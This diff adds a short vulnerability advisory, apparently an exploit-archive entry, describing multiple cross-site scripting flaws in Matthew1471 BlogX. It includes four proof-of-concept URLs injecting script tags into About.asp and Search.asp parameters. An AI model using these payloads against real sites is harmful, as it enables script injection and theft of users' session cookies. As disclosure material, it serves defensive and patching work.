@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/52730/info
+
+Matthew1471 BlogX is prone to multiple cross-site scripting vulnerabilities because it fails to sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks. 
+
+http://www.example.com/About.asp?ShowOriginal="><SCRIPT>alert("demonalex");</SCRIPT>&ShowNew=a&ShowChanges=b
+
+http://www.example.com/About.asp?ShowOriginal=Y&ShowNew="><SCRIPT>alert("demonalex");</SCRIPT>&ShowChanges=b
+
+http://www.example.com/About.asp?ShowOriginal=Y&ShowNew=a&ShowChanges="><SCRIPT>alert("demonalex");</SCRIPT>
+
+http://www.example.com/Search.asp?Search=</title><SCRIPT>alert("demonalex");</SCRIPT>&Page=0
